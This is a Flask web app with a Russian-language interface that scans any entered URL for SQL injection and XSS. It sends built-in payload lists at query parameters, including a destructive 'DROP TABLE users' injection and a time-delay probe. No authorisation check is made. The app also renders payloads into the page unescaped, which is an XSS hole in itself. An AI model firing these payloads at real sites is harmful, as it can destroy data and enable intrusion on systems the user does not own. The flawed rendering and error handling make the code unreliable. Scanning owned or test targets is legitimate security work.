from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import time
import threading
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re

app = Flask(__name__)
CORS(app)

# Глобальные переменные
current_scan_status = {"is_scanning": False, "progress": 0, "results": None, "scan_id": "", "current_target": ""}
scan_counter = 1

# 🔥 РЕАЛЬНЫЕ PAYLOADS как в твоем коде
SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "1 OR 1=1",
    "1' OR 1=1--",
    "1' OR '1'='1'--",
    "admin'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1 UNION SELECT 1,2--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "'; DROP TABLE users--",
    "1' WAITFOR DELAY '0:0:5'--"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>"
]

# SQL ошибки
SQL_ERRORS = [
    "sql syntax", "mysql_fetch", "warning.*mysql", "unclosed quotation",
    "quoted string not properly", "ora-", "postgresql", "sqlite",
    "microsoft ole db", "odbc.*sql", "pg_query", "you have an error"
]

class RealScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})

    def scan_url(self, target_url):
        print(f"🔍 Scanning: {target_url}")
        
        try:
            parsed = urlparse(target_url)
            if not parsed.query:
                return {
                    "success": True, "vulnerabilities_found": 0,
                    "issues": [], "message": "Параметры не найдены (?id=1)"
                }

            params = parse_qs(parsed.query)
            all_results = []
            vulns = 0

            # SQLi сканирование
            for param in list(params.keys())[:2]:  # 2 параметра
                original_response = self.test_url(target_url, param, "1")
                
                for payload in SQLI_PAYLOADS:
                    test_url = self.build_test_url(target_url, param, payload)
                    
                    response = self.test_url(test_url, param, payload)
                    time_diff = abs(response.elapsed.total_seconds() - original_response.elapsed.total_seconds())
                    
                    # Проверки
                    is_sqli_error = self.has_sql_error(response.text)
                    is_sqli_timing = time_diff > 3  # Задержка > 3 сек
                    is_sqli_status = response.status_code >= 500
                    
                    if is_sqli_error or is_sqli_timing or is_sqli_status:
                        vulns += 1
                        all_results.append({
                            "type": "SQL Injection",
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "evidence": "SQL Error" if is_sqli_error else "Timing" if is_sqli_timing else "Status",
                            "severity": "High"
                        })
                    
                    # Прогресс
                    progress = min(80, len(all_results) * 5)
                    current_scan_status["progress"] = progress
                    time.sleep(0.2)

            # XSS сканирование
            current_scan_status["progress"] = 85
            for param in list(params.keys())[:1]:
                for payload in XSS_PAYLOADS:
                    test_url = self.build_test_url(target_url, param, payload)
                    response = self.test_url(test_url, param, payload)
                    
                    if self.has_xss_reflection(response.text, payload):
                        vulns += 1
                        all_results.append({
                            "type": "XSS",
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "severity": "Medium"
                        })

            current_scan_status["progress"] = 100
            
            result = {
                "success": True,
                "url": target_url,
                "vulnerabilities_found": vulns,
                "issues": all_results[:8],  # Топ 8
                "params_found": len(params),
                "scan_time": "30-45 сек"
            }
            
            print(f"✅ Found {vulns} vulnerabilities")
            return result

        except Exception as e:
            current_scan_status["progress"] = 100
            return {"success": False, "error": str(e)}

    def test_url(self, url, param, value):
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)
            return response
        except:
            return requests.Response()

    def build_test_url(self, base_url, param, payload):
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

    def has_sql_error(self, text):
        text_lower = text.lower()
        return any(re.search(pattern, text_lower) for pattern in SQL_ERRORS)

    def has_xss_reflection(self, text, payload):
        return payload.lower() in text.lower()

scanner = RealScanner()

# ПРОСТОЙ HTML
HTML_CONTENT = """
<!DOCTYPE html>
<html>
<head>
    <title>SQLi + XSS Сканер</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width">
    <style>
        body { 
            font-family: -apple-system, sans-serif; 
            max-width: 900px; margin: 40px auto; padding: 20px; 
            background: #f8f9fa; color: #333; line-height: 1.6;
        }
        .card { 
            background: white; padding: 30px; border-radius: 12px; 
            box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
        }
        h1 { 
            color: #2c3e50; text-align: center; margin-bottom: 10px; 
            font-size: 2.2em;
        }
        .subtitle { 
            text-align: center; color: #6c757d; margin-bottom: 30px; 
        }
        .input-row { 
            display: flex; gap: 15px; margin-bottom: 25px; flex-wrap: wrap;
        }
        #urlInput { 
            flex: 1; padding: 15px 20px; border: 2px solid #dee2e6; 
            border-radius: 8px; font-size: 16px; min-width: 350px;
        }
        #urlInput:focus { outline: none; border-color: #007bff; }
        button { 
            padding: 15px 30px; border: none; border-radius: 8px; 
            font-size: 16px; font-weight: 600; cursor: pointer; 
            transition: background 0.2s;
        }
        .scan-btn { background: #28a745; color: white; }
        .scan-btn:hover { background: #218838; }
        .stop-btn { background: #dc3545; color: white; display: none; }
        .stop-btn:hover { background: #c82333; }
        .progress { 
            width: 100%; height: 10px; background: #e9ecef; 
            border-radius: 5px; margin: 20px 0; display: none;
        }
        .progress-fill { 
            height: 100%; background: #28a745; width: 0%; 
            border-radius: 5px; transition: width 0.3s;
        }
        .progress-text { text-align: center; font-weight: 600; color: #495057; }
        .status { 
            padding: 15px 20px; margin: 15px 0; border-radius: 8px; 
            text-align: center; display: none; font-weight: 500;
        }
        .status.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .results { 
            margin-top: 25px; padding: 25px; background: #f8f9fa; 
            border-radius: 12px; display: none;
        }
        .vuln-count { 
            text-align: center; font-size: 2em; font-weight: 700; 
            margin-bottom: 20px;
        }
        .no-vulns { color: #28a745; }
        .has-vulns { color: #dc3545; }
        .vuln-list { display: flex; flex-direction: column; gap: 15px; }
        .vuln-item { 
            background: white; padding: 20px; border-radius: 8px; 
            border-left: 4px solid #007bff; box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }
        .vuln-type { font-weight: 600; color: #2c3e50; margin-bottom: 5px; }
        .vuln-details { color: #6c757d; font-size: 0.95em; }
        @media (max-width: 768px) {
            .input-row { flex-direction: column; }
            #urlInput { min-width: 100%; }
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>🛡️ Сканер уязвимостей</h1>
        <p class="subtitle">SQL Injection + XSS | Тестируйте на <code>testphp.vulnweb.com</code></p>
        
        <div class="input-row">
            <input type="url" id="urlInput" placeholder="https://testphp.vulnweb.com/artists.php?artist=1">
            <button class="scan-btn" onclick="startScan()">🚀 Сканировать</button>
            <button class="stop-btn" onclick="stopScan()">⏹️ Остановить</button>
        </div>
        
        <div id="status" class="status"></div>
        <div id="progress" class="progress">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div id="progressText" class="progress-text">0%</div>
        
        <div id="results" class="results"></div>
    </div>

    <script>
        let pollInterval;

        async function startScan() {
            const url = document.getElementById('urlInput').value.trim();
            if (!url) {
                showStatus('Введите URL!', 'error');
                return;
            }

            document.querySelector('.scan-btn').style.display = 'none';
            document.querySelector('.stop-btn').style.display = 'inline-block';
            document.getElementById('progress').style.display = 'block';
            document.getElementById('results').style.display = 'none';
            showStatus('Запуск сканирования...', 'success');

            try {
                const res = await fetch('/api/scan_web', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url})
                });
                const data = await res.json();
                if (data.scan_id) pollStatus();
            } catch(e) {
                showStatus('Ошибка сети!', 'error');
                resetUI();
            }
        }

        async function pollStatus() {
            pollInterval = setInterval(async () => {
                const res = await fetch('/api/scan_status');
                const status = await res.json();
                
                document.getElementById('progressFill').style.width = status.progress + '%';
                document.getElementById('progressText').textContent = status.progress + '%';
                
                if (!status.is_scanning && status.progress == 100) {
                    clearInterval(pollInterval);
                    if (status.results) showResults(status.results);
                    resetUI();
                }
            }, 500);
        }

        function showResults(data) {
            const results = document.getElementById('results');
            const countEl = document.createElement('div');
            countEl.className = 'vuln-count';
            
            if (!data.success) {
                countEl.textContent = `❌ Ошибка: ${data.error}`;
                countEl.style.color = '#dc3545';
            } else if (data.vulnerabilities_found === 0) {
                countEl.innerHTML = '🟢 0 уязвимостей';
                countEl.className += ' no-vulns';
                results.innerHTML = countEl.outerHTML + '<p style="text-align:center;color:#6c757d;">Сайт защищен</p>';
            } else {
                countEl.innerHTML = `🔴 ${data.vulnerabilities_found} уязвимостей`;
                countEl.className += ' has-vulns';
                results.innerHTML = countEl.outerHTML;
                
                const list = document.createElement('div');
                list.className = 'vuln-list';
                data.issues.forEach(issue => {
                    const item = document.createElement('div');
                    item.className = 'vuln-item';
                    item.innerHTML = `
                        <div class="vuln-type">${issue.type}</div>
                        <div class="vuln-details">
                            Параметр: <strong>${issue.param}</strong><br>
                            Payload: <code>${issue.payload}</code><br>
                            Доказательство: ${issue.evidence}
                        </div>
                    `;
                    list.appendChild(item);
                });
                results.appendChild(list);
            }
            results.style.display = 'block';
        }

        function resetUI() {
            document.querySelector('.scan-btn').style.display = 'inline-block';
            document.querySelector('.stop-btn').style.display = 'none';
        }

        function stopScan() {
            fetch('/api/stop_scan', {method: 'POST'});
            clearInterval(pollInterval);
            resetUI();
        }

        function showStatus(msg, type) {
            const status = document.getElementById('status');
            status.textContent = msg;
            status.className = `status ${type}`;
            status.style.display = 'block';
            setTimeout(() => status.style.display = 'none', 3000);
        }

        document.getElementById('urlInput').addEventListener('keypress', e => {
            if (e.key === 'Enter') startScan();
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_CONTENT

@app.route('/api/scan_web', methods=['POST'])
def scan_web():
    global current_scan_status, scan_counter
    
    if current_scan_status["is_scanning"]:
        return jsonify({"error": "Уже сканируется"}), 409

    data = request.get_json()
    url = data.get('url', '').strip()
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url.lstrip('https://http://')

    current_scan_status.update({
        "is_scanning": True, "progress": 0, "results": None,
        "scan_id": f"scan-{scan_counter}", "current_target": url
    })
    scan_counter += 1
    
    def run_scan():
        try:
            result = scanner.scan_url(url)
            current_scan_status.update({
                "results": result, "progress": 100, "is_scanning": False
            })
        except Exception as e:
            current_scan_status.update({
                "results": {"success": False, "error": str(e)},
                "is_scanning": False
            })
    
    threading.Thread(target=run_scan, daemon=True).start()
    return jsonify({"message": "Запущено", "scan_id": current_scan_status["scan_id"]})

@app.route('/api/scan_status')
def scan_status():
    return jsonify(current_scan_status)

@app.route('/api/stop_scan', methods=['POST'])
def stop_scan():
    current_scan_status["is_scanning"] = False
    return jsonify({"message": "Остановлено"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
